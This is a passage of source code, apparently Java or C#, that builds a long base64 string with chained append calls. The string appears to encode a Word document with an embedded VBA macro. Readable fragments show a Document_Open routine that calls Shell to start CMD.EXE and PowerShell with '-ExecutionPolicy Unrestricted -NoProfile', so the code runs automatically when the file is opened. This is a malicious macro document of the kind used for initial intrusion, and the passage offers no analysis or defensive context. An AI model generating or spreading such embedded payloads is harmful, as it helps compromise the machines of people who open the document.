AAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAP7///8JAAAACgAAAAsAAAAMAAAADQAAAA4AAAAPAAAA/v///xEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAAGQAAABoAAAAbAAAAHAAAAB0AAAAeAAAA/v///yAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAD+////KAAAACkAAAAqAAAAKwAAACwA").append("AAAtAAAALgAAAP7////9////MQAAADIAAAA8AAAAQQAAADUAAAA2AAAANwAAADgAAAA5AAAAOgAAADsAAAA9AAAASAAAAD4AAAA/AAAAQAAAAEIAAAD+////QwAAAEQAAABFAAAARgAAAEcAAAD+/////v//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9SAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAf//////////AwAAAAYJAgAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAACQY+3W").append("di7YATQAAAAAJAAAAAAAAEQAYQB0AGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAIB////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAQAAAAAAAAMQBUAGEAYgBsAGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAgABAAAA//////////8A").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAwhwAAAAAAABXAG8AcgBkAEQAbwBjAHUAbQBlAG4AdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgACAQYAAAAFAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAUAUwB1AG0AbQBhAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAoAAIB////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHwAAAAAQAAAAAAAABQBEAG8AYwB1AG0AZQBuAHQAUwB1AG0AbQBhAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAADgAAgEEAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnAAAAABAAAAAAAABNAGEAYwByAG8AcwAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgABAQIAAAARAAAADwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUMfs1nYu2AFQx+zWdi7YAQAAAAAAAAAAAAAAAFYAQgBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAEA//////////8JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQx+zWdi7YAVDH7NZ2LtgB").append("AAAAAAAAAAAAAAAAZABpAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAgH///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgIAAAAAAABfAF8AUwBSAFAAXwAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAQgAAAALAAAA/////wAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAABRBwAAAAAAAF8AXwBTAFIAUABfADEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAIB////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJwAAAK4AAAAAAAAAXwBfAFMAUgBQAF8AMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAABAAAgAKAAAADQAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAAA3gMAAAAAAAABAAAAAgAAAAMAAAAEAAAABQAAAAYAAAAHAAAACAAAAP7///8KAAAACwAAAAwAAAANAAAADgAAAA8AAAAQAAAAEQAAABIAAAATAAAAFAAAABUAAAAWAAAAFwAAABgAAAAZAAAAGgAAABsAAAAcAAAAHQAAAB4AAAAfAAAAIAAAACEAAAAiAAAAIwAAACQAAAAlAAAAJgAA").append("AP7///8oAAAAKQAAAP7///8rAAAALAAAAC0AAAAuAAAALwAAADAAAAAxAAAAMgAAADMAAAA0AAAANQAAADYAAAA3AAAAOAAAADkAAAD+////OwAAADwAAAD+////PgAAAD8AAABAAAAAQQAAAEIAAABDAAAARAAAAEUAAABGAAAARwAAAEgAAABJAAAASgAAAEsAAABMAAAATQAAAE4AAABPAAAAUAAAAFEAAABSAAAAUwAAAFQAAABVAAAAVgAAAFcAAABYAAAAWQAAAFoAAABbAAAAXAAAAF0AAABeAAAA").append("XwAAAP7///9hAAAAYgAAAGMAAABkAAAAZQAAAGYAAABnAAAAaAAAAGkAAABqAAAAawAAAGwAAABtAAAAbgAAAG8AAABwAAAAcQAAAHIAAABzAAAAdAAAAHUAAAB2AAAAdwAAAHgAAAB5AAAAegAAAHsAAAB8AAAAfQAAAH4AAAB/AAAAgAAAAAH+sYABAAQAAAADADAqAgKQCQBwFAZIAwCCAgBk4gQEAAcAHABQcm9qZWN0BVEAKAAAQAIUBgIUPa0CCgcCbAEUCAYSCQISgAMDqWEGAAwCShI8AgoWAAFy").append("c3RkEG9sZT4CGXMAdAAAZABvAGwAZVAADQBoACVeAAMqAFxHezAwMDIwsDQzMC0ACAQEQwAKAwIOARIwMDQ2fSMAMi4wIzAjQzoAXFdpbmRvd3MAXFN5c3RlbTMEMlwDZTIudGxiACNPTEUgQXV0gG9tYXRpb24AYAMAAoNFTm9ybWFsBYNFToBDcgBtAGFRgEYOACCAEQmAASoMXEMDEgoGYQKpYQQIAIMhT2ZmaWMRhGdPAGaAAGkAYxWCZ56AH5SCIUd7MgBERjhEMDRDLQA1QkZBLTEwMUBCLUJERTWA").append("Z0FqQYBlNIAFMohngLpnAHJhbSBGaWxlAHNcQ29tbW9uAQQGTWljcm9zbwBmdCBTaGFyZQBkXE9GRklDRQAxNlxNU08uRBhMTCOHEINNIDE2IC4wIE9igeMgTMBpYnJhcnmAJYAAIg+CegEAE8IBuF8CGUJlVGhpc0RvAGN1bWVudEcAChjACVTAZmkAcwAiRMBIYwB1QEllAKpuwG4azgsy2gscwBKoAABIQgExQoltwJgWHkICAQUswiHw5iIVQggrQgEQQgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJNLKrIDABAAAAD//wAAAAABAAIA//8AAAAAAQAAAAAAAAAAAAEAAgAAAAAAAAABAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAEACQAAACpcQ05vcm1hbHJVAAEAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAGAAAAAAAAfgoAAAAAAAB+AgAAAAAAAH4CAAAAAAAAfgIAAAAAAAB+AgAAAAAAAH4GAAAAAAAAflIAAAAAAAB/AAAA").append("AAAAAAAiAAAAAAAAABEAAAAAAAAAAAABABAAAAAAAAAAAAAAAGEBAAAAAAAAAAAAACdSBCXOQMBCl5A7rmr8V4ABAAkEAAAaBAAA4gQAAAAAAAABAP//////////AQCDimUAEQAAAAAAAAAAAAIAcQgAAAAAAAAAAAAA//////////8BAEEIAAAAAAAAAAAAAP//AAAxAQAAAAAAAAAAAAAFAHECAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQQUAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAABEAAAAAAAAAAQAAAG642aA6oFtPgSL5YFpRbFuxBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAIMAAAAAAAAAFRoaXNEb2N1bWVudAIAAAAAAAACBwAAAAAAAABQcm9qZWN0BAAAAAAAAAPvBAIAAAAAAMAAAAAAAABGEgAAAAAAAAJCAAAAAAAAAEM6XFByb2dyYW0gRmlsZXNcQ29tbW9uIEZpbGVzXE1pY3Jvc29mdCBTaGFyZWRcVkJBXFZCQTcu").append("MVxWQkU3LkRMTAIAAAAAAAACAwAAAAAAAABWQkEQAAAAAAAACoEBAAAAAAAAAAAAAP//////////BAACAAkAAACxAQAAAAAAAAAAAABRAgAAAAAAAAAAAACwAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAwUJAgAAAAAAwAAAAAAAAEYQAAAAAAAAAjoAAAAAAAAAQzpcUHJvZ3JhbSBGaWxlc1xNaWNyb3NvZnQgT2ZmaWNlXHJvb3RcT2ZmaWNlMTZcTVNXT1JELk9MQgIAAAAAAAACBAAAAAAAAABXb3Jk").append("BAAAAAAAAAMCCgIAAAAAAMAAAAAAAABGEAAAAAAAAAoBAwAAAAAAAAAAAAD//////////wgABwAAAAAAMQMAAAAAAAAAAAAAwQMAAAAAAAAAAAAA0AAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAMwBAIAAAAAAMAAAAAAAABGCAAAAAAAAAIfAAAAAAAAAEM6XFdpbmRvd3NcU3lzdGVtMzJcc3Rkb2xlMi50bGICAAAAAAAAAgYAAAAAAAAAc3Rkb2xlEAAAAAAAAAqhBAAAAAAAAAAAAAD//////////wIA").append("AAAAAAAA0QQAAAAAAAAAAAAAIQUAAAAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAANM0Pgt+lsbEL3lAKoARN5SEAAAAAAAAAI/AAAAAAAAAEM6XFByb2dyYW0gRmlsZXNcQ29tbW9uIEZpbGVzXE1pY3Jvc29mdCBTaGFyZWRcT0ZGSUNFMTZcTVNPLkRMTAIAAAAAAAACBgAAAAAAAABPZmZpY2UQAAAAAAAACtEFAAAAAAAAAAAAAP//////////AgAIAAAAAAABBgAAAAAAAAAAAACRBgAA").append("AAAAAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAA2sJAgAAAAAAwAAAAAAAAEYEAAAAAAAAAyhRlg28LABPocgm9Vfis0EEAAAAAAAAA45hhZRkVOxIqDfBN/Wy5gMGAAAAAAAAA6/xd8wJDBhJomVLssljaSoEAAAAAAAAAggAAAAAAAAARG9jdW1lbnQEAAAAAAAAAg0AAAAAAAAARG9jdW1lbnRfT3BlbgYAAAAAAAANFAAUAAAAeAAAAAAAAAAAAAAAAAAAAAQAAAAAAAALBgAAAEMATQBEAAIA").append("AAAAAAALAgAAAC4ABAAAAAAAAAsGAAAARQBYAEUABAAAAAAAAAIIAAAAAAAAAFZCRTcuRExMDgAAAAAAAAcxCQAAAAAAAAAAAAD//////////1gCCwDhCQAAAAAAAAAAAAAwAQAAAAAAAAAAAAAgAAAAAAAADgICYQAECAIEAAAAAAAACwoAAABQAG8AdwBlAHIABAAAAAAAAAsKAAAAUwBoAGUAbABsAAIAAAAAAAALAgAAACAACAAAAAAAAAsUAAAALQBFAHgAZQBjAHUAdABpAG8AbgAIAAAAAAAACwwA").append("AABQAG8AbABpAGMAeQAIAAAAAAAACxgAAABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAEAAAAAAAACwYAAAAtAE4AbwAGAAAAAAAACw4AAABQAHIAbwBmAGkAbABlAGYAAAAAAAB/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJVQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAACAAAAAAAAfnoAAAAAAAB/AAAAAAAAAAASAAAAAAAAABEA").append("AAAAAAAAAAAAAP//////////////////////////AAAAABEAAAAAAAAAAAADAAYAAAAAAAAJEQQAAAAAAAAAAAAA4QMAAAAAAAAAAAAAEAAAAAAAAAAAAAEAYgAAAAAAAH8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJVgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAEQAAAAAAAAAAAAAAEQAAAAAAAAAAAAMAUAAAAAAAAAAAAAAAAQABAAwAAABhCQAAAAAA").append("AAAAAACxCAAAAAAAAAAAAADhCAAAAAAAAAAAAAABCQAAAAAAAAAAAADxCgAAAAAAAAAAAAAhCwAAAAAAAAAAAABRCwAAAAAAAAAAAABxCwAAAAAAAAAAAADBCwAAAAAAAAAAAAARDAAAAAAAAAAAAABhDAAAAAAAAAAAAACRDAAAAAAAAAAAAAABAAEAAAABAHEHAAAAAAAAAAAAAKEHAAAAAAAAAAAAANEHAAAAAAAAAAAAABEAAAAAAAAAAQACAEEHAAAAAAAAAAAAAAgADQBgAAAA4QMAAAAAAAAAAAAA").append("sQAAAAAAAAAAAAEAEQgAAAAAAAAAAAAA////////////////AQAFAAAAAAAEYGkEAAAAAAAAAAACAP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8BALsB6QIAAAAAAAAAAAIAggEAAAAAAAAAAQAAAAAAAGcCBgAAAGcCQAAAAPAFAgAAAPcFAQD3BQIAUAFnA/j////3").append("BQMAUAFxA+D////9BAAAEAC9Atj///+9A/j///+8A+D///9nArIAAADwBQIAAAD3BQQA9wUFAFABZwP4////9wUGAFABZwPQ////9wUHAFABZwPI////9wUIAFABZwPA////9wUGAFABZwO4////9wUJAFABZwOw////9wUGAFABZwOo////9wUKAFABZwOg////9wULAFABcQPg/////QQAABAAvQLY////6wUQAPj////Q////yP///8D///+4////sP///6j///+g////vAPg////ZwIAAAAA+AEAAAAA").append("AAAAAAgAYAAAAQAAOAAAAAgAAAAAAAAAAAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAEoAAAAAAAAAAAAJAAAAAAAAAAAA+P///wEA0P///wEAyP///wEAwP///wEAuP///wEAsP///wEAqP///wEAoP///wEA4P///wIAFAAAAAAAABMAAGAAkQIAAAAAAAAAAAIAEQQAAAAAAAAAAAIAIAAAAAAAAA4AAVoAAggMAAAAAAAAfyAAAAAAAAAOAAFaAAIIXAAAAAAAAH8AAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByVUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAABEAAAAAAAAAAAACAP///////////////wAAAAB4AAAACAA4AOEBAAAAAAAAAAACAAAABGAAABAOOAD/////////////////////AAAAAAAAAAAfAAAAAAAAAGIAAAAAAAB/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABFgMABgABAADE").append("BQAA5AAAABICAAAFBgAAEwYAAGcHAAAAAAAAAQAAALhf8OYAAP//owEAAIgAAAC2AP//AQEAAAAA/////wAAAAD//3AA//8AAChRlg28LABPocgm9Vfis0GOYYWUZFTsSKg3wTf1suYDAAAAAAAAAAAAAAAAAAAAAAEAAACv8XfMCQwYSaJlS7LJY2kqEAAAAAMAAAAFAAAABwAAAP//////////AQEIAAAA/////3gAAAAIr/FfAF8AUwBSAFAAXwAzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADoAAACcAAAAAAAAAFQAaABpAHMARABvAGMAdQBtAGUAbgB0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAIBDAAAAA4AAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPQAAAI4IAAAAAAAAXwBWAEIAQQBfAFAA").append("UgBPAEoARQBDAFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABoAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAiAkAAAAAAABQAFIATwBKAEUAQwBUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAQcAAAAQAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAIcAAABvAQAAAAAAAHfMCQwYSaJlS7LJY2kqKFGWDbwsAE+hyCb1V+KzQf//AAAAAE1FAAD///////8AAAAA//8AAAAA//8BAQAAAADfAP//AAAAACgA//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9QAAAA").append("AgBTIv////8AAAEAUxD/////AAABAFMi/////wAAAAA2Iv////8AAAAAGgj/////AAAAAAI8MAD//wAAAAACPDgA//8AAAAAAjz/////AAD//wEBAAAAAAEAKAAxAE4AbwByAG0AYQBsAC4AVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQACQAAAAAAiAAAAAEBIAMAAAKA/v//////IAAAAP////8wAAAAAgH//wAAAAAAAAAA//////////8AAAAAAAAAAB0AAAAlAAAA/////ygBAABABP7/cAIAAPj/////").append("////CAD//yAAAAD/////MgIAAP////8AAAAAAAAAAAEAAABABP7//////+D/////////DAD//yAAAACwAAAAAAAAAGmD/v//////////////////////AAAAAP////8gAAAA/////wAAAAACg/7//////wAAAAD/////6AAAAAAA////////AAAAAP//////////AAAAAAAAAAAdABgAJQAAAIKgJAL//////v////////8gAQAAAgD///7///8AAAAA//////////8AAAAAAAAAAB0AGAAlAAAACxEwAv//").append("//8AAARgAAAAAP//////////AAAAAAAAAAAAAAAAAAAAALgBAACg////awAAAAAAAAD/////GAAAABAOAAAEAAQAAAAAAAAAAACcAAABAAAAAGmD/v//////////////////////AAAAAP////8gAAAA/////1gCAAD/////oAEAAP////+oAQAA//////////////////////////////////////////////////////////////////////////////////////////9AAAAA/////3AAAAD/////////").append("////////////WAIAAP////////////////////////////////////////////////////////////////////9YAAAA/////0AE/v//////2P////////8FAP//IAAAAEAE/v+IAgAA0P////////8IAP//IAAAAEAE/v+gAgAAyP////////8IAP//IAAAAEAE/v+4AgAAwP////////8IAP//IAAAAEAE/v/QAgAAuP////////8IAP//IAAAAEAE/v/oAgAAsP////////8IAP//IAAAAEAE/v8AAwAA").append("qP////////8IAP//IAAAAEAE/v//////oP////////8IAP//IAAAAP////9QAAAAAQABAAAAAQAAAAAAAAAAACgBAAD//////////wAAAAD//////////ygBAAD//////////wAAAAD////////////////wAAAAuAAAAAAAAAAAAAAAeAAAAAgAAAAAABgOEA7/////////////////////////////EAAAAAIAOAAAAAMDqWEGAAEkACoAXABSAGYAZgBmAGYAKgAwADUANgAxAGEAOQAwADMAMAAzAAEQ").append("ACoAXABSADAAKgAjADEANwDfAQAAAAAA/////2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+ygEABAAigQgABgAGAAAAAAAAgQgEIgBAABAAAAAAgQgEfACyAFAAAAAEgQgAAgAIAAgAAAD/////AQHYAAAAlgQoAQAAAABvAP//YAAAALkAAwBDTUQAuQABAC4ACwC5AAMARVhFAAsAHQBBQDICAQCiev1/AAD/////QAAAAP////8Q").append("AAAA/////yAAAAC5AAUAUG93ZXIAuQAFAFNoZWxsAAsAuQABACAACwC5AAoALUV4ZWN1dGlvbgsAuQAGAFBvbGljeQsAuQABACAACwC5AAwAVW5yZXN0cmljdGVkCwC5AAEAIAALALkAAwAtTm8ACwC5AAcAUHJvZmlsZQALAB0AQUAyAgEAAAAAAP////+oAAAA/////wAAAR2xAEF0dHJpYnV0AGUgVkJfTmFtAGUgPSAiVGhpAHNEb2N1bWVuEHQiDQoKjEJhcwECjDFOb3JtYWwCLhlWR2xvYmFsIQGq").append("U3BhYwFsRmEIbHNlDKJDcmVhEHRhYmwVH1ByZSBkZWNsYQAGSWQRAJ5UcnUNQkV4cAhvc2UUHFRlbXAAbGF0ZURlcmkCdhUkQ3VzdG9tbGl6hEODMVAAGAAcIBBTdWIghYdfT3CAZW4oKQ0KIAAAAFNoZWxsICgiAENNRCIgKyAiQi6CAkVYRSIMEFBwb3dlcgIOAhmCBCABggItRXhlY3V0CGlvbgIHUG9saQxjeQIFgw9VbnJlQnOA0WN0ZWQICy0ETm+CBlByb2ZpRGxlgTdFbmSBVA0ACgAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgQAAAIIAAACDAAAAhAAAAIUAAACGAAAA/v///4gAAACJAAAAigAAAIsAAACMAAAA/v////7///+PAAAA/v//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////MYbIAAAMA/xoEAAAJBAAA4gQDAAAAAAAAAAAAAQAFAAIAIAEqAFwARwB7ADAAMAAwADIAMAA0AEUARgAtADAAMAAwADAALQAwADAAMAAwAC0AQwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AIwA0").append("AC4AMgAjADkAIwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwAQwBvAG0AbQBvAG4AIABGAGkAbABlAHMAXABNAGkAYwByAG8AcwBvAGYAdAAgAFMAaABhAHIAZQBkAFwAVgBCAEEAXABWAEIAQQA3AC4AMQBcAFYAQgBFADcALgBEAEwATAAjAFYAaQBzAHUAYQBsACAAQgBhAHMAaQBjACAARgBvAHIAIABBAHAAcABsAGkAYwBhAHQAaQBvAG4AcwAAAAAAAAAAAAAAAAAaASoAXABHAHsA").append("MAAwADAAMgAwADkAMAA1AC0AMAAwADAAMAAtADAAMAAwADAALQBDADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAA0ADYAfQAjADgALgA3ACMAMAAjAEMAOgBcAFAAcgBvAGcAcgBhAG0AIABGAGkAbABlAHMAXABNAGkAYwByAG8AcwBvAGYAdAAgAE8AZgBmAGkAYwBlAFwAcgBvAG8AdABcAE8AZgBmAGkAYwBlADEANgBcAE0AUwBXAE8AUgBEAC4ATwBMAEIAIwBNAGkAYwByAG8AcwBvAGYAdAAg").append("AFcAbwByAGQAIAAxADYALgAwACAATwBiAGoAZQBjAHQAIABMAGkAYgByAGEAcgB5AAAAAAAAAAAAAAAAALwAKgBcAEcAewAwADAAMAAyADAANAAzADAALQAwADAAMAAwAC0AMAAwADAAMAAtAEMAMAAwADAALQAwADAAMAAwADAAMAAwADAAMAAwADQANgB9ACMAMgAuADAAIwAwACMAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAdABkAG8AbABlADIALgB0AGwAYgAjAE8A").append("TABFACAAQQB1AHQAbwBtAGEAdABpAG8AbgAAAAAAAAAAAAAAAAASACoAXABDAE4AbwByAG0AYQBsABIAKgBcAEMATgBvAHIAbQBhAGwAYQKpYQgAAAAAAAAAKAEqAFwARwB7ADIARABGADgARAAwADQAQwAtADUAQgBGAEEALQAxADAAMQBCAC0AQgBEAEUANQAtADAAMABBAEEAMAAwADQANABEAEUANQAyAH0AIwAyAC4AOAAjADAAIwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwAQwBv").append("AG0AbQBvAG4AIABGAGkAbABlAHMAXABNAGkAYwByAG8AcwBvAGYAdAAgAFMAaABhAHIAZQBkAFwATwBGAEYASQBDAEUAMQA2AFwATQBTAE8ALgBEAEwATAAjAE0AaQBjAHIAbwBzAG8AZgB0ACAATwBmAGYAaQBjAGUAIAAxADYALgAwACAATwBiAGoAZQBjAHQAIABMAGkAYgByAGEAcgB5